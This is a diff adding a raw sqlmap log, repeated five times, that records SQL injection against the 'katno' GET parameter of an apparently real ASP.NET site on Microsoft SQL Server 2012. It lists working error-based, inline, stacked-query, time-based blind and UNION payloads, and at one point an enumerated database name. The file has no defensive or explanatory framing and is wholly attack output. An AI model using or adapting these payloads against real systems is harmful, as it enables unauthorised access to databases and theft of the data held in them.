@@ -1,0 +1,133 @@
+sqlmap identified the following injection point(s) with a total of 224 HTTP(s) requests:
+---
+Parameter: katno (GET)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: katno=151 AND 4596=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4596=4596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: katno=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (7703=7703) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: katno=151;WAITFOR DELAY '0:0:5'--
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (comment)
+    Payload: katno=151 WAITFOR DELAY '0:0:5'--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: katno=151 UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(68)+CHAR(119)+CHAR(117)+CHAR(97)+CHAR(111)+CHAR(117)+CHAR(117)+CHAR(105)+CHAR(109)+CHAR(114)+CHAR(107)+CHAR(76)+CHAR(98)+CHAR(77)+CHAR(106)+CHAR(83)+CHAR(101)+CHAR(67)+CHAR(76)+CHAR(117)+CHAR(101)+CHAR(107)+CHAR(82)+CHAR(80)+CHAR(76)+CHAR(87)+CHAR(69)+CHAR(86)+CHAR(88)+CHAR(100)+CHAR(122)+CHAR(108)+CHAR(112)+CHAR(101)+CHAR(78)+CHAR(86)+CHAR(111)+CHAR(89)+CHAR(76)+CHAR(68)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113),NULL-- -
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft SQL Server 2012
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: katno (GET)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: katno=151 AND 4596=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4596=4596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: katno=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (7703=7703) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: katno=151;WAITFOR DELAY '0:0:5'--
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (comment)
+    Payload: katno=151 WAITFOR DELAY '0:0:5'--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: katno=151 UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(68)+CHAR(119)+CHAR(117)+CHAR(97)+CHAR(111)+CHAR(117)+CHAR(117)+CHAR(105)+CHAR(109)+CHAR(114)+CHAR(107)+CHAR(76)+CHAR(98)+CHAR(77)+CHAR(106)+CHAR(83)+CHAR(101)+CHAR(67)+CHAR(76)+CHAR(117)+CHAR(101)+CHAR(107)+CHAR(82)+CHAR(80)+CHAR(76)+CHAR(87)+CHAR(69)+CHAR(86)+CHAR(88)+CHAR(100)+CHAR(122)+CHAR(108)+CHAR(112)+CHAR(101)+CHAR(78)+CHAR(86)+CHAR(111)+CHAR(89)+CHAR(76)+CHAR(68)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113),NULL-- -
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft SQL Server 2012
+available databases [1]:
+[*] alp_planer
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: katno (GET)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: katno=151 AND 4596=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4596=4596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: katno=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (7703=7703) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: katno=151;WAITFOR DELAY '0:0:5'--
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (comment)
+    Payload: katno=151 WAITFOR DELAY '0:0:5'--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: katno=151 UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(68)+CHAR(119)+CHAR(117)+CHAR(97)+CHAR(111)+CHAR(117)+CHAR(117)+CHAR(105)+CHAR(109)+CHAR(114)+CHAR(107)+CHAR(76)+CHAR(98)+CHAR(77)+CHAR(106)+CHAR(83)+CHAR(101)+CHAR(67)+CHAR(76)+CHAR(117)+CHAR(101)+CHAR(107)+CHAR(82)+CHAR(80)+CHAR(76)+CHAR(87)+CHAR(69)+CHAR(86)+CHAR(88)+CHAR(100)+CHAR(122)+CHAR(108)+CHAR(112)+CHAR(101)+CHAR(78)+CHAR(86)+CHAR(111)+CHAR(89)+CHAR(76)+CHAR(68)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113),NULL-- -
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft SQL Server 2012
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: katno (GET)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: katno=151 AND 4596=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4596=4596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: katno=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (7703=7703) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: katno=151;WAITFOR DELAY '0:0:5'--
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (comment)
+    Payload: katno=151 WAITFOR DELAY '0:0:5'--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: katno=151 UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(68)+CHAR(119)+CHAR(117)+CHAR(97)+CHAR(111)+CHAR(117)+CHAR(117)+CHAR(105)+CHAR(109)+CHAR(114)+CHAR(107)+CHAR(76)+CHAR(98)+CHAR(77)+CHAR(106)+CHAR(83)+CHAR(101)+CHAR(67)+CHAR(76)+CHAR(117)+CHAR(101)+CHAR(107)+CHAR(82)+CHAR(80)+CHAR(76)+CHAR(87)+CHAR(69)+CHAR(86)+CHAR(88)+CHAR(100)+CHAR(122)+CHAR(108)+CHAR(112)+CHAR(101)+CHAR(78)+CHAR(86)+CHAR(111)+CHAR(89)+CHAR(76)+CHAR(68)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113),NULL-- -
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft SQL Server 2012
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: katno (GET)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+    Payload: katno=151 AND 4596=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4596=4596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: katno=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (7703=7703) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: katno=151;WAITFOR DELAY '0:0:5'--
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (comment)
+    Payload: katno=151 WAITFOR DELAY '0:0:5'--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: katno=151 UNION ALL SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+CHAR(68)+CHAR(119)+CHAR(117)+CHAR(97)+CHAR(111)+CHAR(117)+CHAR(117)+CHAR(105)+CHAR(109)+CHAR(114)+CHAR(107)+CHAR(76)+CHAR(98)+CHAR(77)+CHAR(106)+CHAR(83)+CHAR(101)+CHAR(67)+CHAR(76)+CHAR(117)+CHAR(101)+CHAR(107)+CHAR(82)+CHAR(80)+CHAR(76)+CHAR(87)+CHAR(69)+CHAR(86)+CHAR(88)+CHAR(100)+CHAR(122)+CHAR(108)+CHAR(112)+CHAR(101)+CHAR(78)+CHAR(86)+CHAR(111)+CHAR(89)+CHAR(76)+CHAR(68)+CHAR(113)+CHAR(118)+CHAR(122)+CHAR(120)+CHAR(113),NULL-- -
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: Microsoft SQL Server 2012
